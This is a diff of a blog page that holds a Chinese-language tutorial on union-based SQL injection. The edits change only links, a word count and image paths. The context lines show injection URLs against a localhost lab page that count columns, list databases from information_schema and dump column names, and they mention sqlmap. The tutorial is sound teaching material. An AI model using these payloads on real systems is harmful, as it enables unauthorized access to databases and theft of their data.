@@ -97,7 +97,7 @@
                 
                 <a class="menu-item" href="/about/" title="">About</a>
                 
-                <a class="menu-item" href="shell.kayleh.top" title="">Terminal</a>
+                <a class="menu-item" href="https://shell.kayleh.top" title="">Terminal</a>
                 
         </div>
     </div>
@@ -120,7 +120,7 @@
                 
                 <a class="menu-item" href="/about/" title="">About</a>
                 
-                <a class="menu-item" href="shell.kayleh.top" title="">Terminal</a>
+                <a class="menu-item" href="https://shell.kayleh.top" title="">Terminal</a>
                 
         </div>
     </div>
@@ -135,8 +135,12 @@
                 Written by <a itemprop="name" href="https://kayleh.top" rel="author">Kayleh</a> with ♥ 
                 <span class="post-time">
                 on <time datetime=2021-04-06 itemprop="datePublished">April 6, 2021</time>
-                </span>
-                in
+                </span>.
+                Total words:
+                481
+                ,ReadingTime:
+                3 minutes
+                
                 
         </div>
     </header>
@@ -268,7 +272,7 @@ http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/
 </code></pre><p>在地址后面加入以下代码</p>
 <pre><code>http://localhost/sqls/index.php?id=2  union select null,null,null limit 1,1
 </code></pre><p>第二个：哪个列中的数据是在页面中显示出来的，有一些列中的数据只是用于后台程序处理，并不会在前台显示，所以我们需要判断哪个字段我们可以看到。所以，我们要通过数字代替NULL进行查询，来确定哪些字段会在页面中显示。这也就是为什么我们不一开始就用数字而用null，因为union select 不仅要求列的数量相同 同时数据类型也要相似。</p>
-<p><img src="D:%5CBlog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%5C584a947239ae725aab3ee529f701eb7d.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/584a947239ae725aab3ee529f701eb7d.jpg" alt="img"></p>
 <ul>
 <li>查询库名</li>
 </ul>
@@ -288,7 +292,7 @@ http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/
 <pre><code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata
 </code></pre><p>还可以获取第一个库名：</p>
 <pre><code>http://localhost/sqls/index.php?id=2 union select null,schema_name,null from information_schema.schemata limit 0,1
-</code></pre><p><img src="D:%5CBlog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%5C86d1024ab776770ef0a2f6e559ec83df.jpg" alt="img"></p>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/86d1024ab776770ef0a2f6e559ec83df.jpg" alt="img"></p>
 <p>并没有显示数据库名而显示的是第一条语句查询出来的结果。在union前面加上and 1=2，就能显示出来了。</p>
 <pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select null,schema_name,null from information_schema.schemata limit 0,1
 </code></pre><p>获取第二个库名：</p>
@@ -310,7 +314,7 @@ http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/
 <p>在MySQL中，字段名存放在information_schema数据库下columns表column_name字段中,这里使用的是columns表。</p>
 <p>方法一:</p>
 <pre><code>http://localhost/sqls/index.php?id=2 and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='test' and table_name='sqltest'
-</code></pre><p><img src="D:%5CBlog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%5C055b34fa808266a8e9af8b9cea0865db.jpg" alt="img"></p>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/055b34fa808266a8e9af8b9cea0865db.jpg" alt="img"></p>
 <p>也可以查看admin表中的字段。</p>
 <p>方法二:</p>
 <pre><code>http://localhost/sqls/index.php?id=2  union select null,column_name,null from information_schema.columns where table_schema='test' and table_name='admin'
@@ -385,7 +389,7 @@ http:<span style="color:#f92672">//</span>localhost<span style="color:#f92672">/
 <p>&ndash;batch  :跳过选择</p>
 </blockquote>
 <p>开始注入，获得数据库</p>
-<p><img src="D:%5CBlog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%5C1617674097343.png" alt="1617674097343"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/kayleh/cdn4/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/1617674097343.png" alt="1617674097343"></p>
 
     </div>
 
